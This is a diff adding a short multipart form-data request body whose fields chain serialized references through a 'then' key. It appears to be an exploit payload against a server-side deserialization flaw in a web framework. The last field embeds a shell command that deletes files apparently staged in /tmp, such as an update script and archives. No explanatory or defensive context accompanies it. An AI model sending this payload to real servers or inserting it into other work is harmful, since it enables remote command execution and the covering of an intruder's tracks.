@@ -1,0 +1,13 @@
+------formdata-11fbd91aeb0ddb1b
+Content-Disposition: form-data; name="0"
+
+["$1"]
+------formdata-11fbd91aeb0ddb1b
+Content-Disposition: form-data; name="1"
+
+{"then":"$2:0"}
+------formdata-11fbd91aeb0ddb1b
+Content-Disposition: form-data; name="2"
+
+["$@1","rm -f /tmp/.cache/upd.sh /tmp/.cache/*.tgz"]
+------formdata-11fbd91aeb0ddb1b--
